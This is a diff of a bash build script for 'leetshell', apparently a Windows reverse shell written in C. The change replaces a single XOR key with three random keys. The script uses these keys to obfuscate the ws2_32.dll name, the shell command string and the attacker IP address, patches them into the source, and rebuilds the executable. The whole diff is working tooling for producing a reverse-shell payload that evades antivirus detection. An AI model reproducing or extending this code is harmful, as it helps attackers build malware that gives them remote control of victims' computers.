@@ -39,22 +39,30 @@ done
 len=${#ip}
 lastChar=$((len - 1))
 
-# === generate random XOR key ===
-xor_key=$((RANDOM % 256))
-xor_hex=$(printf '0x%02x' $xor_key)
+# === generate random XOR keys ===
+xor_key1=$((RANDOM % 256))
+xor_hex1=$(printf '0x%02x' $xor_key1)
 
-# === Update XOR_KEY define in leetshell.c ===
-sed -i "s/^#define XOR_KEY.*/#define XOR_KEY $xor_hex/" "$filename"
+xor_key2=$((RANDOM % 256))
+xor_hex2=$(printf '0x%02x' $xor_key2)
+
+xor_key3=$((RANDOM % 256))
+xor_hex3=$(printf '0x%02x' $xor_key3)
+
+# === Update KEY values defined in leetshell.c ===
+sed -i "s/^#define KEY1.*/#define KEY1 $xor_hex1/" "$filename"
+sed -i "s/^#define KEY2.*/#define KEY2 $xor_hex2/" "$filename"
+sed -i "s/^#define KEY3.*/#define KEY3 $xor_hex3/" "$filename"
 
 # === Update ws2_32.dll string ===
 ws2="ws2_32.dll"
 encoded_ws2="{"
 for (( i=0; i<${#ws2}; i++ )); do
   byte=$(printf "%d" "'${ws2:$i:1}")
-  xor_byte=$((byte ^ xor_key))
+  xor_byte=$((byte ^ xor_key1))
   encoded_ws2+=$(printf "0x%02x, " $xor_byte)
 done
-encoded_ws2+=$(printf "0x%02x" $xor_key)
+encoded_ws2+=$(printf "0x%02x" $xor_key1)
 encoded_ws2+="}"
 sed -i "s/char ws2_32_dll\[\] = .*;/char ws2_32_dll[] = $encoded_ws2;/" "$filename"
 
@@ -68,10 +76,10 @@ fi
 encoded_shell="{"
 for (( i=0; i<${#shell_str}; i++ )); do
   byte=$(printf "%d" "'${shell_str:$i:1}")
-  xor_byte=$((byte ^ xor_key))
+  xor_byte=$((byte ^ xor_key2))
   encoded_shell+=$(printf "0x%02x, " $xor_byte)
 done
-encoded_shell+=$(printf "0x%02x" $xor_key)
+encoded_shell+=$(printf "0x%02x" $xor_key2)
 encoded_shell+="}"
 sed -i "s/char cmd\[\] = .*;/char cmd[] = $encoded_shell;/" "$filename"
 
@@ -80,7 +88,7 @@ result="{"
 for (( i=0; i<$len; i++ )); do
   char=${ip:$i:1}
   char_ord=$(printf '%d' "'$char")
-  xor_result=$((char_ord ^ xor_key))
+  xor_result=$((char_ord ^ xor_key3))
   xor_char=$(printf '0x%02x' $xor_result)
 
   if [ $i -eq $lastChar ]; then
@@ -89,7 +97,7 @@ for (( i=0; i<$len; i++ )); do
     result+="$xor_char,"
   fi
 done
-result+=$(printf ", 0x%02x}" $xor_key)
+result+=$(printf ", 0x%02x}" $xor_key3)
 
 # === patch IP and port ===
 sed -i "s/char ip\[\] = .*;/char ip[] = $result;/g" "$filename"
@@ -117,3 +125,4 @@ fi
 
 # === clean up ===
 rm -f src/leetshell.exe src/*.o
+
